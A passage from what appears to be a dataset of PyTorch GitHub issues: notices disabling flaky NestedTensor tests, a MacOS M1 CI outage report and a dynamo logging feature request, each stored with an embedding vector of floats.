 -1.79946408e-01  3.58169496e-01 -9.59571525e-02  2.65463680e-01
  1.62231922e-01 -3.60665202e-01 -2.95983225e-01  4.74704541e-02
  4.46403809e-02  3.59809957e-03 -3.85145485e-01 -2.90567905e-01
  3.52451280e-02 -2.22946718e-01 -1.61938012e-01  9.96266305e-02
 -1.06323346e-01  8.06985721e-02  1.58739552e-01 -1.99960358e-02
 -2.21233398e-01  4.15021449e-01 -1.71819702e-02 -1.47683904e-01
 -3.10843699e-02 -3.62179339e-01  1.00356467e-01 -2.76633620e-01
 -1.04764178e-01 -1.03294134e-01  2.59845287e-01  2.72109240e-01
  9.11956131e-02  1.42227441e-01 -1.08133830e-01 -1.50733851e-02
 -3.01138461e-01 -8.77274051e-02  1.98855370e-01  5.02027154e-01
  1.45272151e-01 -7.38350302e-02  1.42850712e-01  5.02759457e-01
 -4.42971289e-01  2.79620737e-02 -4.35645223e-01 -3.20540547e-01
  1.86448634e-01 -9.53828543e-02  6.07797392e-02 -1.81144476e-01
  2.19835058e-01  3.74579787e-01 -4.07649934e-01  2.05375925e-01
 -2.30524004e-01  2.41920084e-01  1.32774964e-01 -2.02515095e-01
  3.46300006e-01 -2.75953948e-01  2.64105946e-01  5.59295751e-02
 -3.19461934e-02  1.94991291e-01  1.22824565e-01  2.01545119e-01]"
DISABLED test_softmax_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_softmax_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18342689810).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_softmax_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

ConnectionTimeoutError: Connect timeout for 5000ms, GET https://raw.githubusercontent.com/pytorch/pytorch/main/test/test_nestedtensor.py -2 (connected: false, keepalive socket: false, socketHandledRequests: 1, socketHandledResponses: 0)
headers: {}

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False,"[-4.06284779e-01  3.10495496e-04 -2.44610935e-01 -1.72054037e-01
 -1.35701627e-01 -4.23543721e-01 -1.88877247e-02  8.96121785e-02
 -3.55227590e-01 -3.23075056e-01  3.02741587e-01 -1.11583360e-01
  2.07120374e-01  1.40945449e-01 -2.10145488e-02 -1.33160025e-01
 -1.25189841e-01 -4.74640243e-02  4.26342964e-01  1.24358237e-01
 -1.12633526e-01 -1.71638690e-02 -1.87935501e-01  8.88235569e-02
  1.92006975e-01  4.41726819e-02  3.09337284e-02 -1.47618800e-01
  1.09948128e-01  1.27612531e-01  2.07633525e-01  1.67939723e-01
 -1.24171771e-01 -8.69242921e-02  4.98621672e-01  2.33230397e-01
 -2.19271094e-01 -2.05606014e-01 -2.95575559e-01 -1.51755482e-01
  2.15062737e-01  1.06830209e-01 -4.54609841e-03 -3.05966064e-02
  1.63218051e-01  7.57912360e-03 -1.60706773e-01  2.97637105e-01
 -1.67233169e-01  2.34413706e-02  1.27622783e-01 -6.91389740e-02
 -2.00634450e-02 -3.01401317e-01  6.65654093e-02 -3.13978970e-01
  5.76062351e-02  2.47813404e-01  7.59621188e-02  2.79483974e-01
  2.16213390e-01  9.44158509e-02  5.81650026e-02 -4.77191098e-02
  1.84923559e-02  1.26147553e-01  2.54431367e-01 -3.49489629e-01
  4.00685400e-01 -1.06194459e-01 -3.09347492e-02 -4.37025279e-02
 -4.17631507e-01  6.57410771e-02  1.62415594e-01  1.07506119e-01
 -3.10542405e-01  2.82870103e-02 -1.13813385e-01  9.79908556e-02
 -1.79904908e-01 -1.57012150e-01  1.28676474e-01  1.03650980e-01
  1.07796639e-01  1.74353905e-02  1.34043455e-01  4.59215790e-02
  7.02730268e-02 -1.97435334e-01  1.70390129e-01  3.05074483e-01
 -2.41270334e-01  3.94426323e-02 -1.74338311e-01 -1.99757740e-01
  3.52648467e-01 -1.36568278e-01 -5.15032709e-01  1.09423339e-01
  2.49528170e-01 -2.99499243e-01 -5.80069013e-02  3.36089849e-01
 -4.26295027e-02 -2.10111365e-01  4.49449062e-01  5.51319644e-02
  6.67019933e-03 -2.74535790e-02  2.46776007e-02  7.29755014e-02
  5.75725585e-02  9.30380598e-02 -8.83571133e-02 -5.17888926e-02
 -2.48717755e-01 -6.73481002e-02 -3.42991836e-02  5.72566867e-01
 -2.00202093e-01 -9.72802937e-02 -3.37145440e-02 -5.90522178e-02
  3.37871075e-01  4.50303853e-02 -2.52797037e-01  1.34441197e-01
  1.53486103e-01 -8.88607502e-02  8.92868191e-02  1.59295738e-01
 -1.56460375e-01 -8.47721547e-02  2.11251989e-01  1.93194702e-01
 -2.38680944e-01 -2.61076689e-01  9.83258188e-02  2.23035216e-02
 -1.54541969e-01  1.04362994e-01  1.32603496e-02 -1.48274943e-01
  1.65954649e-01  9.72643793e-02 -1.13044575e-01  1.77111626e-01
 -8.80738869e-02  1.53647378e-01  1.49398297e-01  1.24330088e-01
  2.61305690e-01  3.66626352e-01 -5.24900258e-02 -8.27156454e-02
  5.50480485e-01  8.49227235e-02 -2.12255530e-02 -1.99935913e-01
 -5.00585809e-02  3.97194445e-01 -5.73300645e-02 -4.39936295e-04
  3.32614362e-01 -1.96491525e-01 -4.93454158e-01  1.62232071e-02
 -7.69951940e-02  1.35281682e-01  2.70206556e-02 -1.28761128e-01
  1.29533023e-01 -3.46201919e-02 -5.90522727e-03  5.22925518e-03
  3.87701601e-01 -2.53737748e-01 -3.21643129e-02  1.12777144e-01
  4.96360660e-02  3.30053866e-02  5.52347396e-03  3.75573114e-02
 -8.97013843e-02  1.38494194e-01  1.59187615e-02  3.51274759e-03
 -1.13236442e-01 -1.38413548e-01 -3.57857645e-01 -2.45694488e-01
  8.74089822e-03 -2.79991254e-02 -2.54805684e-01 -2.98068404e-01
  7.38591999e-02 -1.86393857e-02 -4.57476918e-03  1.36984080e-01
 -1.56828910e-01  2.65307903e-01  2.24870086e-01 -8.03907514e-02
  1.41818702e-01  9.53272283e-02 -2.60992229e-01 -4.63255227e-01
  2.69521028e-01  8.10603872e-02 -8.22256953e-02 -6.37577474e-02
 -3.19814980e-01 -2.86134481e-01 -1.56239748e-01  9.54947248e-03
  1.18645094e-01  1.18357074e-02 -1.25567168e-01  1.99286312e-01
 -3.64296377e-01 -2.26270989e-01 -2.08705366e-01 -1.23656273e-01
 -3.09823215e-01 -2.74118721e-01 -1.56038791e-01  3.37681293e-01
  6.19475916e-03 -1.92289613e-02 -7.72909150e-02 -2.02650741e-01
  1.19008340e-01 -8.49504545e-02  2.02804372e-01 -1.47035569e-01
 -2.21826553e-01 -8.37560222e-02 -1.69996202e-01  5.57150602e-01
 -2.77762175e-01 -5.68050623e-01 -7.48937279e-02 -1.57217328e-02
  5.09075681e-03  1.11279793e-01  2.38475695e-01 -6.07260205e-02
 -1.02108195e-01  2.31662095e-02 -1.98439926e-01 -2.55006880e-01
  2.84553736e-01  9.81791914e-02  2.36923665e-01  3.19597602e-01
 -1.18434705e-01  3.62082571e-02 -4.71098945e-02 -4.30165678e-02
 -4.10485193e-02  4.41877156e-01 -1.65249631e-01  3.79727095e-01
  2.20191970e-01 -5.72039895e-02 -2.69949764e-01  5.71889319e-02
  1.22696444e-01 -2.65096158e-01  5.07400393e-01 -5.34880519e-01
  1.52993232e-01  1.02741063e-01  2.06596106e-01 -2.46649176e-01
  4.87735689e-01  2.37765342e-01 -6.52286187e-02 -3.75839621e-02
  1.03295282e-01  4.01394144e-02  1.39657315e-02 -1.51243880e-01
  1.80083990e-01 -1.93954304e-01 -3.92148308e-02 -1.82637185e-01
 -2.34900892e-01 -1.81979477e-01 -5.26899919e-02  4.17533219e-02
  1.12661406e-01  5.75152896e-02 -3.39739025e-01 -9.88057330e-02
  3.41686964e-01 -1.28867298e-01  2.08016932e-01 -2.80212648e-02
 -1.52263641e-01 -1.67349249e-01  2.04338096e-02 -2.78441429e-01
  3.86005975e-02  1.59116946e-02 -2.30484549e-03  9.67508256e-02
  3.74718577e-01 -2.00138807e-01  1.91521987e-01  2.88853258e-01
 -1.34738445e-01  1.54019296e-01 -6.35044873e-02  8.78492296e-02
 -2.91395307e-01  2.75833338e-01  3.62705849e-02  2.37528175e-01
  2.33841106e-01 -1.26488298e-01 -4.79094416e-01  1.94278181e-01
  2.53503509e-02 -2.31151544e-02 -3.27267289e-01 -1.48164704e-01
 -6.13256171e-02 -5.15399985e-02 -9.11184698e-02 -1.56689882e-01
 -1.41728848e-01 -1.88431010e-01  5.75462803e-02 -6.94993883e-02
 -1.81727678e-01  4.50001717e-01 -5.77026792e-03 -2.68470526e-01
  4.15868200e-02 -2.83271015e-01  8.00076053e-02 -3.63898009e-01
 -1.01366192e-01 -1.56386048e-01  2.70374775e-01  1.42424673e-01
  2.12464482e-01  2.39185225e-02 -1.18141711e-01  9.48482454e-02
 -1.50339156e-01 -1.88149095e-01  7.45960474e-02  5.23744464e-01
  1.87668622e-01  1.39147818e-01  3.43483210e-01  4.73937154e-01
 -2.77666420e-01 -6.28783107e-02 -3.32051039e-01 -2.57586718e-01
  8.91358033e-02 -1.35096401e-01  3.04836594e-02  8.51532146e-02
  1.52674854e-01  3.25842530e-01 -2.84972399e-01  1.47533521e-01
 -2.74740726e-01  3.55407476e-01  1.77754074e-01 -8.56866091e-02
  1.91782653e-01 -1.72549516e-01  1.24482237e-01  2.57520266e-02
 -1.12089820e-01  6.90916851e-02  1.52709231e-01  2.97404945e-01]"
Self-hosted MacOS M1 CI outage with broken conda environment ci: sev,"## Current Status
Ongoing

## Error looks like
MacOS M1 jobs all fail due to missing packages

## Incident timeline (all times pacific)
Nov 2nd 2023

## User impact
MacOS M1 jobs are not run

## Root cause
TBD

## Mitigation
Jobs have been marked as unstable:
* https://github.com/pytorch/pytorch/issues/112832
* https://github.com/pytorch/pytorch/issues/102299

## Prevention/followups
TBD
",False,"[-3.44924808e-01 -3.26918066e-01  2.01049805e-01  1.27328783e-01
  8.99901316e-02 -2.18860894e-01 -3.40366960e-02  8.66934955e-02
 -5.11664748e-01 -2.05188617e-01  1.59967422e-01  2.56713718e-01
 -2.80250013e-01 -7.39655718e-02 -2.90929466e-01  6.75871074e-02
 -2.20431641e-01 -5.46495199e-01  9.72688645e-02  4.41069379e-02
 -1.94297358e-01 -2.09768891e-01 -2.21121281e-01  5.73862419e-02
  1.46281034e-01  5.14949381e-01  1.96699366e-01  3.01215827e-01
 -1.90606266e-01  1.45727769e-01  3.29199694e-02  2.57896274e-01
  1.72656700e-02  1.81883112e-01  6.14758492e-01  8.63728002e-02
  7.77890384e-02 -4.06075478e-01 -3.52806300e-01 -4.97577906e-01
 -8.33762884e-02 -4.77914959e-02  1.35827363e-01 -1.18228406e-01
  1.45152092e-01 -2.29309663e-01  8.72933269e-02 -2.13485673e-01
 -1.21583350e-01 -3.41603577e-01  1.95587993e-01  4.21573147e-02
  2.72426933e-01 -3.27240199e-01  5.26594631e-02  5.83149418e-02
 -1.96846612e-02  2.99422622e-01  3.94166589e-01  3.97056758e-01
  3.09493780e-01  1.42053410e-01 -6.16169944e-02  5.52925207e-02
  5.72458878e-02  1.34367645e-01  2.38058686e-01 -2.72727251e-01
  4.65473458e-02  5.96805438e-02  1.06625237e-01 -1.51102930e-01
 -4.95677829e-01 -6.63621798e-02  1.07955635e-01  5.10112464e-01
  1.42945021e-01 -5.47100484e-01  1.86682418e-02 -5.31849228e-02
 -7.59330392e-02 -1.77323017e-02  9.66663510e-02  9.61159617e-02
  2.79808342e-01 -3.31051528e-01  5.31479418e-02 -2.27958545e-01
  3.10714990e-01 -1.76079437e-01  3.33772004e-01  1.28187805e-01
  1.13631777e-01 -1.26225263e-01  3.84394735e-01 -3.85784507e-02
  2.54583567e-01  4.97082293e-01 -1.88194335e-01  8.05220827e-02
  7.62823503e-03  2.08277162e-02 -3.94399688e-02  2.39740416e-01
 -3.86939049e-01 -8.95700902e-02  4.20495152e-01 -8.11955240e-03
  1.45018119e-02  7.19485618e-03  1.10009819e-01  4.92235757e-02
 -3.50055918e-02 -5.82860224e-02  2.33539492e-01  1.57780975e-01
 -2.51969993e-01  1.10370569e-01 -6.87929466e-02  2.59844303e-01
 -2.02052012e-01 -2.10925728e-01 -2.19011039e-01 -5.34757972e-02
  3.34218055e-01  2.69590735e-01 -1.89683229e-01  1.04184598e-01
 -6.52825907e-02 -1.98888004e-01 -1.20288834e-01  1.38042904e-02
  2.08323181e-01  3.30773629e-02 -7.72696286e-02  4.40195203e-01
 -4.54183072e-02 -1.29573524e-01 -2.38256976e-01  1.37037203e-01
 -1.11699544e-01 -1.75774574e-01 -5.90133071e-02 -9.37459543e-02
  3.59365106e-01  4.69035581e-02 -2.80379921e-01  2.19663158e-01
  1.40253291e-01 -2.17736110e-01  1.61307365e-01  9.27513093e-02
 -1.57127678e-02  5.13370514e-01 -1.38593363e-02  1.56589374e-01
  1.86293393e-01  1.10948965e-01 -2.42830709e-01 -1.39755592e-01
  1.50649428e-01  1.73004866e-01 -3.07906419e-01  2.48778760e-01
  2.67258674e-01 -1.42630160e-01 -2.40690023e-01 -8.52915421e-02
 -1.54767990e-01  2.60501176e-01 -2.36109942e-01 -3.06201816e-01
  2.59179652e-01 -1.30912811e-01 -1.47573367e-01 -2.07136706e-01
  7.86250830e-02  1.15593486e-01 -2.02408224e-01  5.44618024e-03
 -1.03425369e-01  4.21834290e-02 -5.83853014e-03  2.89778352e-01
 -7.13052675e-02  5.77606820e-02  3.54502171e-01  8.38979185e-02
 -1.71097428e-01  1.25894785e-01 -5.19088507e-01  2.76881725e-01
  3.59427482e-01  5.38102537e-02  1.72025293e-01 -5.86762168e-02
  7.44989216e-02  9.25761685e-02 -2.49015301e-01  2.16404170e-01
  6.54326454e-02 -1.74732268e-01 -1.82130873e-01  1.04473017e-01
 -1.66224048e-01 -1.06326863e-02 -3.52050066e-01  1.53621003e-01
 -1.97285414e-01 -7.70675763e-02  3.73090059e-02  9.43001211e-02
  4.15669978e-01  8.01179111e-02 -2.30249912e-01  1.11656383e-01
 -6.23317659e-02  2.14308128e-01  4.85771447e-02  3.27273197e-02
  7.60364532e-02 -2.84538805e-01 -1.58635855e-01 -1.31011993e-01
  2.89223939e-01 -1.10930309e-01 -1.62653536e-01 -2.23337084e-01
 -1.44862365e-02  1.24474272e-01 -2.83071101e-01  4.95866016e-02
  1.33956045e-01 -7.90714920e-02  1.55302912e-01  1.30992785e-01
  1.52252480e-01 -2.89936781e-01 -2.43363440e-01  8.09639394e-02
 -2.68855184e-01 -1.91486716e-01 -1.86944902e-01  1.77880079e-01
  2.84757555e-01  4.77189012e-02 -9.70567316e-02 -2.97502205e-02
 -5.62126711e-02 -9.18832123e-02  2.03083195e-02 -1.20770611e-01
 -1.52276792e-02  1.80365220e-02 -3.25908989e-01  5.19656897e-01
  1.30745191e-02 -1.74714252e-04  4.52463701e-02  7.45711327e-02
 -1.32281631e-01  1.92035139e-01  1.14500761e-01  2.18964130e-01
  6.81326017e-02  4.64718759e-01 -4.94557649e-01  2.70700715e-02
  1.68606043e-01 -7.93731585e-02  1.72246948e-01 -5.59003830e-01
  4.51699466e-01 -9.35757160e-02  2.82403558e-01 -3.29547226e-02
  1.33220613e-01  9.24972445e-02 -7.11313486e-02  3.85312364e-04
 -1.84853561e-03  6.57813847e-02 -3.40870261e-01  1.13560356e-01
  2.49300927e-01 -1.83351099e-01 -1.90267384e-01 -3.13146204e-01
 -9.71988738e-02 -3.08880359e-02 -1.07128903e-01  2.21231077e-02
  3.15375030e-01  5.49717061e-03 -8.85253996e-02  1.89786389e-01
  1.13732725e-01  5.59414774e-02 -7.06248730e-02 -3.12116623e-01
 -3.29109043e-01 -2.56927967e-01  5.72596118e-02  6.30854517e-02
 -1.46249324e-01 -1.14117578e-01  7.43670911e-02  1.02965742e-01
  3.81656736e-01 -2.09787413e-01  1.06559515e-01  1.96227968e-01
 -1.51573922e-02  1.23837635e-01 -1.50307089e-01 -1.15172416e-01
 -2.42559701e-01  4.99398857e-01  6.70838170e-04  4.35510725e-02
 -1.17282867e-01  1.32630080e-01 -4.26649302e-01  2.99796015e-01
  5.36940575e-01 -3.14989127e-02 -2.55324364e-01 -1.76169515e-01
  1.63613826e-01  7.51113594e-02  2.12923899e-01 -1.54762477e-01
 -3.08571458e-01  9.81456339e-02 -3.84768955e-02  3.69099498e-01
 -1.58154815e-01  3.87585647e-02 -9.40365642e-02 -1.55982912e-01
 -8.13875794e-02  2.40962803e-02 -6.51779100e-02  1.66948617e-01
 -2.34538242e-01 -1.86199576e-01  7.30136130e-03  2.47261912e-01
 -7.08198398e-02  1.27801001e-01 -3.98063898e-01  6.79679066e-02
 -2.22804397e-01 -1.74674064e-01 -1.40717521e-01  2.32670993e-01
  2.26563826e-01  3.09393823e-01  8.43325444e-03  6.13378845e-02
 -3.87237102e-01 -1.31785810e-01 -6.52995706e-01  2.38941684e-02
 -7.81069174e-02  5.55039495e-02 -2.94946790e-01  3.79007459e-01
 -3.82723570e-01 -2.94686854e-01  1.15694609e-02 -1.81608722e-02
  1.27394587e-01  3.65951538e-01  3.03062797e-01 -1.99293375e-01
  6.82541355e-02  1.64992139e-02 -9.00370628e-02  5.40683270e-02
  2.16410868e-02 -1.81235313e-01 -1.56963602e-01 -1.12064056e-01]"
[dynamo] skipping reason is ambiguous in logs ,"### ðŸš€ The feature, motivation and pitch

Should report which of the following is the reason for skipping

```python
frame.f_lasti >= first_real_inst_idx(frame.f_code)
or skipfiles.check(frame.f_code)
or config.disable
```

### Alternatives

Hard to diagnose skipping reason, making it hard to debug things like:
https://github.com/pytorch/pytorch/pull/112233 
https://github.com/pytorch/pytorch/issues/112865



### Additional context

NIL",False,"[-0.11825522  0.07410641 -0.18079185 -0.20999089  0.4578268  -0.16010062
  0.48392484  0.29764745 -0.2600057   0.12953128 -0.03188409 -0.12808767
  0.0569665  -0.05469966 -0.0585436  -0.16209728  0.03783654 -0.27571324
 -0.16409662 -0.05834961 -0.24666932  0.06685961 -0.00891762  0.19063517
 -0.03652336  0.11689103 -0.16076033  0.08322811  0.16305557  0.2717088
 -0.20053914  0.37463838 -0.16903064 -0.09961886  0.20382458  0.2290819
 -0.05437691 -0.05736089 -0.23221894 -0.39635515 -0.07662599 -0.14155656
  0.12723303  0.12727687 -0.20934263  0.2587194  -0.2194753   0.19577208
 -0.26611823 -0.07477069 -0.05428391  0.17514168 -0.04296592 -0.5260711
  0.2303766   0.0039086   0.20877784  0.19322425  0.10157202 -0.02939304
 -0.12466364 -0.04961514  0.05076247  0.04482485  0.33838552 -0.09575591
 -0.1937007   0.13213465  0.47623107  0.16165882  0.4208453  -0.07998703
 -0.0711898   0.07117856  0.26743457  0.2474731  -0.27427155  0.08317986
 -0.07850362 -0.34038383 -0.06722258 -0.14168823 -0.09316081  0.11406288
  0.10163558 -0.00601303  0.34577832 -0.1170097   0.2874686   0.35779196
  0.32496285 -0.26194692  0.0049594   0.11139894 -0.05727594  0.20792197
  0.01098197  0.209822   -0.49005875  0.15349583  0.09974516 -0.32798842
 -0.01060355  0.13270892  0.07406771 -0.23683101  0.2625025   0.21220176
  0.19724058 -0.3082738   0.01108029 -0.31964996  0.10051568  0.15073572
  0.08268839 -0.12677644  0.06474931 -0.19335993 -0.05293959 -0.16392772
  0.24440545  0.23476666  0.21241057  0.22041534  0.10731995 -0.09145352
 -0.07608037 -0.20339233 -0.00111246 -0.0340909   0.0467711  -0.27160478
 -0.10112735 -0.03200252  0.04714185  0.01825016  0.32650453  0.2426295
 -0.04053475  0.15791464  0.1652112  -0.18113501  0.14276302 -0.17137986
 -0.00198737 -0.01991374 -0.35799962  0.0345637   0.13644907 -0.4284421
 -0.08250062 -0.08809094 -0.27969283  0.35090733 -0.02383772 -0.12036989
  0.15557097  0.21568108  0.11150904 -0.21631736 -0.05875161  0.34717643
  0.05170693 -0.2663622   0.22366141  0.21302998 -0.21554258 -0.05452605
 -0.29112437  0.0854421  -0.39587203 -0.05406162  0.17185944 -0.15215504
  0.16076511 -0.1644429  -0.2746729  -0.13298701  0.31063068  0.3102611
  0.48196852  0.26470912 -0.01754854  0.13287379  0.15426359  0.21817982
  0.17316908  0.12195958  0.13403647 -0.09625952 -0.41177362 -0.09936782
  0.00834465  0.0830079   0.03578714  0.02118174  0.01675195  0.14999308
 -0.00504929  0.18290019 -0.25722456  0.13564071  0.07116466 -0.35722485
  0.07180876  0.25585383 -0.28054142 -0.42894566  0.3270126   0.02978235
 -0.42763075 -0.22403847 -0.06456999 -0.39786893  0.2406361   0.06284907
 -0.3040663  -0.10440798 -0.16708806 -0.02547728 -0.02857832  0.15193078
 -0.17921293 -0.21371329 -0.15071215 -0.0101542   0.05876816  0.07917976
 -0.18882015 -0.05191058  0.25283226 -0.43330523  0.69842076 -0.03250494
  0.1845824  -0.08775304 -0.07329352 -0.06397178  0.03930894  0.11690114
 -0.3485499  -0.23060448 -0.0329404   0.1622026   0.05760852  0.05783329
 -0.4168332  -0.172416   -0.28829056 -0.11943994  0.04708426  0.02407232
 -0.01478585 -0.09792962 -0.08347305  0.30854973  0.0767643   0.09393606
 -0.02869384 -0.13225818  0.09486929  0.4788366  -0.13104984  0.15822107
  0.33922553  0.25266963 -0.15387455  0.3475877  -0.0737437   0.11338852
  0.01894615 -0.2653637  -0.09729202  0.24460931  0.29531747 -0.1631954
  0.57602096 -0.17273627 -0.04976381 -0.10164152  0.05318754  0.13983168
 -0.29529452  0.24560392  0.25605237 -0.23651472 -0.06122046 -0.14886978
 -0.04521949 -0.22690696 -0.3407876   0.19558463  0.06472868 -0.15177107
 -0.13768366  0.34927922 -0.34817535 -0.18514961 -0.08658749  0.1093888
 -0.02335516 -0.07810633 -0.01940151  0.06198961  0.02163153 -0.16967507
  0.08990323  0.03681194  0.15607114 -0.00099704 -0.36782542  0.2950729
 -0.12546061  0.09851348  0.07096767  0.129363   -0.27315146  0.41463667
 -0.3295708   0.24290103 -0.31908518 -0.49711788 -0.15426765  0.13490288
  0.44070172  0.23197907 -0.17273693  0.03922298 -0.30446607  0.0287771
  0.22825086 -0.00888525 -0.2666721  -0.09130497 -0.02956307 -0.31847286
  0.12286407  0.35702822 -0.02678098 -0.09499002 -0.10357853 -0.11422573
 -0.20583534 -0.31299835 -0.11120775 -0.04735059 -0.00962952  0.2849184
  0.13219702 -0.2110732  -0.05318969  0.10456063 -0.11359032 -0.0478723
 -0.10027878  0.3302887  -0.00799256  0.21997117 -0.00111847 -0.0643377
 -0.1811308   0.05155658 -0.4362936  -0.11162499 -0.1340771  -0.08281547
  0.25691754  0.11873483  0.01789059 -0.23566273 -0.20309515  0.0528926
  0.0036452   0.17825542  0.3395968  -0.08050036  0.1329697  -0.07968636
 -0.12312555 -0.11383026 -0.12812851  0.25591764  0.14423122  0.19379422]"
DISABLED test_transpose_inference_mode_interaction_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_inference_mode_interaction_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18328894360).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_inference_mode_interaction_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False,"[-4.98209119e-01 -1.08995065e-01 -1.67418092e-01 -2.29913354e-01
 -1.68038785e-01 -2.93917656e-01  1.27553120e-01 -1.08588926e-01
 -2.49067754e-01 -2.93060809e-01  3.73967141e-01 -1.00530460e-01
  3.12614799e-01  2.00261191e-01 -1.31619811e-01 -1.44111425e-01
 -1.68274075e-01  3.47073264e-02  4.49136287e-01 -1.68662854e-02
 -1.68485835e-01  8.16419348e-03 -2.47012794e-01  8.06250796e-02
  3.38913389e-02 -1.13641694e-02  1.46348298e-01 -7.52940774e-02
  1.61114484e-01  4.15223762e-02  4.30684447e-01  3.21184784e-01
 -2.36408189e-01 -1.58548489e-01  1.69117659e-01  1.74361274e-01
 -2.24516928e-01 -2.07427129e-01 -1.14604473e-01 -1.32025629e-01
  1.56744167e-01  1.33879125e-01  5.32261990e-02 -7.69030750e-02
  1.24160178e-01 -9.89359021e-02 -9.74646583e-02  1.47378162e-01
 -3.16478074e-01  9.95384250e-03  2.07428932e-01 -3.07955034e-02
 -1.10015422e-01 -3.83779824e-01  2.28481237e-02 -1.76316246e-01
 -1.22737922e-02  3.09560239e-01  8.65486190e-02  1.57406151e-01
  1.89257026e-01  5.60316071e-02 -1.97661519e-02 -3.02212536e-02
 -1.63843073e-02  1.86477363e-01  2.28561223e-01 -2.11470172e-01
  5.49679160e-01  9.09024775e-02 -1.48303717e-01 -4.39267140e-04
 -3.79581422e-01 -8.95323157e-02  7.88760036e-02  1.81495517e-01
 -3.77449393e-01  1.25384703e-01 -5.58413379e-02 -9.50224996e-02
 -9.66906846e-02 -7.31519097e-03 -2.69996352e-03  1.67954899e-02
  1.60531834e-01 -3.88475321e-03  1.24634482e-01 -1.20997213e-01
  1.40843645e-01 -1.20351449e-01  3.50090742e-01  2.37177968e-01
 -8.77681375e-02 -7.20430762e-02 -2.63923824e-01 -7.11306930e-03
  2.37889856e-01 -2.56003112e-01 -1.42701671e-01  1.54864624e-01
  7.05260877e-03 -1.33991957e-01 -1.77150026e-01  3.50504071e-01
 -1.01898864e-01 -3.40951294e-01  3.27700853e-01  1.37240753e-01
  1.69713259e-01  1.61358893e-01 -1.73417941e-01 -7.76489303e-02
  1.21855110e-01  9.53326374e-03 -1.81815013e-01 -3.35795134e-02
  5.35274297e-03 -5.28774112e-02  2.10067838e-01  2.79433906e-01
 -1.05528377e-01 -1.60237849e-01  9.90200937e-02  1.40283823e-01
  3.60146642e-01 -1.16942801e-01 -4.14328665e-01  7.35948086e-02
  1.37726530e-01 -1.05826266e-01  2.21053630e-01  1.71050936e-01
 -1.59280613e-01 -2.04592407e-01  1.12836622e-01  1.15930557e-01
 -1.77124828e-01 -2.83550084e-01 -4.14150171e-02  1.45682484e-01
 -1.68224782e-01 -4.48359773e-02  9.13294032e-03 -5.05092368e-02
  3.53142083e-01  2.29391351e-01 -1.97064251e-01  8.23801979e-02
 -1.08003840e-01  1.06400698e-01  1.50242031e-01  7.15482011e-02
  2.75476545e-01  3.77566963e-01 -1.32443318e-02  3.06261554e-02
  5.08384466e-01  2.35327668e-02  1.03156962e-01 -1.00050606e-01
 -1.14214800e-01  5.33169508e-01  4.31717187e-02 -3.25662531e-02
  2.58897781e-01 -8.25154111e-02 -2.74700165e-01  4.37647775e-02
  6.26491159e-02  1.09520599e-01  9.23877396e-03 -2.27159813e-01
  4.27985713e-02 -6.19924143e-02  5.61139248e-02 -8.62622634e-02
  2.01528549e-01 -3.38336349e-01  3.29739228e-02  2.28422552e-01
 -2.55219266e-02  1.16546787e-01  1.14186235e-01  8.68276134e-02
 -1.85771018e-01  1.72314048e-01  1.92886949e-01  5.58622032e-02
 -8.44603032e-02 -3.69201303e-02 -4.41955090e-01 -3.39495361e-01
 -5.40069416e-02  6.21339306e-02 -3.39372605e-01 -2.18269795e-01
  1.54804468e-01 -4.26540226e-02  2.74584722e-02  1.41503200e-01
 -1.95118174e-01  5.54559268e-02  2.32561156e-01 -2.35670403e-01
 -6.94599003e-03  2.67977640e-02 -8.59195516e-02 -3.94607872e-01
  1.75329030e-01  2.57162470e-02 -1.52918071e-01 -3.51321608e-01
 -3.73484939e-01 -2.31655836e-01 -8.99327919e-02 -9.15050209e-02
 -2.17214562e-02  1.21314019e-01 -1.23654693e-01  3.17765594e-01
 -2.70661563e-01 -5.35626188e-02  8.28016102e-02 -1.00498199e-01
 -2.94826329e-01 -2.19581664e-01 -1.82904184e-01  1.27822652e-01
 -1.32249996e-01 -6.27171062e-03  5.75875491e-03 -4.20751631e-01
  2.57775664e-01  2.58281827e-03  1.05328649e-01 -1.14311397e-01
 -1.92356825e-01 -1.13841131e-01 -1.31340668e-01  3.55282933e-01
 -2.57296592e-01 -4.20355320e-01 -1.48838818e-01 -2.18975134e-02
 -1.00445328e-02  1.20372571e-01  2.41295233e-01 -8.01105648e-02
 -1.21096045e-01  1.27091520e-02 -1.90783992e-01 -2.84387052e-01
  3.54217470e-01  1.60937697e-01  1.53160602e-01  3.55731368e-01
 -1.33997887e-01  5.29563315e-02 -1.16248637e-01  1.37870863e-01
  5.84198944e-02  5.19686222e-01 -1.14928745e-01  4.30708766e-01
  3.38514835e-01  5.45967370e-03 -3.73390019e-01  9.50967520e-02
  2.94461638e-01 -2.24919170e-01  2.10878223e-01 -4.22626019e-01
  2.18612939e-01 -5.30261025e-02  3.16906273e-01 -1.09099425e-01
  3.47931087e-01 -1.68623626e-02  1.45193534e-02  6.37507588e-02
